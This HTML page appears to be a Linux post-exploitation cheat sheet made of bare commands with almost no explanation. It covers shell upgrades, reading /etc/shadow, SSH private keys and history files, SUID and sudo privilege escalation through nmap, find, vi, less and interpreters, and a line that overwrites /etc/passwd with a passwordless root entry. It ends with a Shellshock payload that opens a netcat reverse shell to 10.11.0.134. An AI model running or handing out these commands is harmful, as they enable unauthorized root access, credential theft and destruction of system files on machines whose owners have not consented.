<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Bash</title>
</head><body><b><span style="font-size: 12pt">Shell upgrade</span></b><br/>
<b><br/>
</b><b>python</b><tt><br/>
</tt><tt><br/>
python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'<br/>
export TERM=linux<br/>
</tt><br/>
<b>perl</b><br/>
<tt><br/>
perl -e 'exec &quot;/bin/bash&quot;;'<br/>
</tt><tt>export TERM=linux</tt><br/>
<br/>
<b><span style="font-size: 12pt"><br/>
</span></b><b><span style="font-size: 12pt">Enumeration</span></b><br/>
<br/>
<b>List users</b><br/>
<tt><br/>
</tt><tt>cat /etc/passwd | cut -d: -f1</tt><br/>
<br/>
<b>List root users</b><br/>
<tt><br/>
grep -v -E &quot;^#&quot; /etc/passwd | awk -F: '$3 == 0 { print $1}'<br/>
</tt><tt>awk -F: '($3 == &quot;0&quot;) {print}' /etc/passwd</tt><br/>
<br/>
<b>List sudoers</b><br/>
<tt><br/>
cat /etc/sudoers<br/>
<br/>
</tt><b>List allowed sudo commands for current user</b><tt><br/>
</tt><tt><br/>
</tt><tt>sudo -l</tt><br/>
<br/>
<b>Sensitive files and locations</b><br/>
<tt><br/>
cat /etc/passwd<br/>
cat /etc/group<br/>
cat /etc/shadow<br/>
<br/>
ls -alh /var/mail/<br/>
ls -ahlR /root/<br/>
ls -ahlR /home/<br/>
<br/>
cat /var/apache2/config.inc<br/>
cat /var/lib/mysql/mysql/user.MYD<br/>
cat /root/anaconda-ks.cfg<br/>
<br/>
cat ~/.bash_history<br/>
cat ~/.nano_history<br/>
cat ~/.atftp_history<br/>
cat ~/.mysql_history<br/>
cat ~/.php_history<br/>
<br/>
cat ~/.bashrc<br/>
cat ~/.profile<br/>
cat /var/mail/root<br/>
</tt><tt>cat /var/spool/mail/root</tt><br/>
<br/>
<b>SSH information</b><br/>
<tt><br/>
cat ~/.ssh/authorized_keys<br/>
cat ~/.ssh/identity.pub<br/>
cat ~/.ssh/identity<br/>
cat ~/.ssh/id_rsa.pub<br/>
cat ~/.ssh/id_rsa<br/>
cat ~/.ssh/id_dsa.pub<br/>
cat ~/.ssh/id_dsa<br/>
cat /etc/ssh/ssh_config<br/>
cat /etc/ssh/sshd_config<br/>
cat /etc/ssh/ssh_host_dsa_key.pub<br/>
cat /etc/ssh/ssh_host_dsa_key<br/>
cat /etc/ssh/ssh_host_rsa_key.pub<br/>
cat /etc/ssh/ssh_host_rsa_key<br/>
cat /etc/ssh/ssh_host_key.pub<br/>
</tt><tt>cat /etc/ssh/ssh_host_key</tt><br/>
<br/>
<span style="font-size: 10pt"><b>Check file type</b><br/>
<tt><br/>
</tt><tt>file file</tt><br/>
<br/>
<b>Print printable strings from elf binary</b><br/>
<tt><br/>
</tt></span><span style="font-size: 10pt"><tt>strings file</tt></span><br/>
<br/>
<br/>
<b><span style="font-size: 10pt">SUID priv escalation</span><span style="font-size: 12pt"><br/>
</span><span style="font-size: 10pt"><br/>
</span></b><span style="font-size: 10pt">Target is to set SUID bit on some sensitive program<b><br/>
</b><tt><br/>
</tt><tt>-rw<b>s</b>rwxrwx 1 root  root  1109604 May 17 00:18 bash</tt><b><br/>
</b><b><br/>
</b>for example by running this command with root privileges<br/>
(there are exploits which allows running commands as root)<b><br/>
</b><tt><br/>
</tt><tt>chown root:root bash &amp;&amp; chmod 4777 bash</tt><b><br/>
</b></span><b><span style="font-size: 12pt"><br/>
</span><br/>
Search for SUID executables<br/>
</b><tt><br/>
find /usr/bin -user root -perm -4000 -exec ls -ld {} \; &gt;/tmp/setuid<br/>
<br/>
<br/>
</tt><b><span style="font-size: 10pt">Switch user</span><span style="font-size: 12pt"><br/>
</span><span style="font-size: 10pt"><br/>
</span><span style="font-size: 10pt">different user can be sudoer</span><span style="font-size: 12pt"><br/>
</span></b>su - &lt;user&gt;<span style="font-size: 12pt"><b><br/>
</b></span><span style="font-size: 12pt"><b><br/>
</b></span><b><span style="font-size: 10pt"><br/>
</span>Get root shell with sudo<br/>
<br/>
nmap<tt><br/>
</tt></b><tt><br/>
sudo nmap --interactive<br/>
</tt><tt>!sh</tt><b><br/>
</b><b><br/>
</b><b>find</b><br/>
<tt><br/>
</tt><tt>sudo find /etc -exec sh -i \;</tt><br/>
<br/>
<b>vi</b><br/>
<tt><br/>
sudo vi<br/>
</tt><tt>:shell</tt><br/>
<br/>
<b>less</b><br/>
<tt><br/>
sudo less file.txt<br/>
</tt><tt>!bash</tt><br/>
<br/>
<b>more(read file longer than 1 page)</b><br/>
<tt><br/>
sudo more file.txt<br/>
</tt><tt>!bash</tt><br/>
<br/>
<b>programming languages</b><br/>
<tt><br/>
sudo python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'<br/>
sudo perl -e 'exec &quot;/bin/sh&quot;;'<br/>
</tt><tt>sudo ruby -e 'exec &quot;/bin/sh&quot;'</tt><br/>
<br/>
<span style="font-size: 10pt"><b><br/>
</b></span><span style="font-size: 10pt"><b>Adding root to /etc/passwd file without passwd</b></span><br/>
<tt><br/>
</tt><tt>echo root::0:0:root:/root:/bin/bash &gt; /etc/passwd</tt><br/>
<br/>
<br/>
<span style="font-size: 10pt"><b>Escape rshell</b></span><br/>
<tt><br/>
$ vi or vim<br/>
:set shell=/bin/bash<br/>
:shell<br/>
or<br/>
:! /bin/bash<br/>
<br/>
awk 'BEGIN {system(&quot;/bin/bash&quot;)}'<br/>
find / -name blahblah 'exec /bin/awk 'BEGIN {system(&quot;/bin/sh&quot;)}' \;<br/>
<br/>
$ more or less<br/>
'! /bin/sh'<br/>
'!/bin/sh'<br/>
'!bash'<br/>
<br/>
python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()<br/>
</tt><tt>perl -e 'exec &quot;/bin/sh&quot;;'</tt><br/>
<br/>
Escape with shellshock<b><br/>
</b><tt>() { :;}; /bin/bash -c nc -nv 10.11.0.134 80 -e /bin/bash<br/>
</tt><tt>env x='() { :;}; echo vulnerable' /bin/bash -c ls</tt><br/>
</body></html>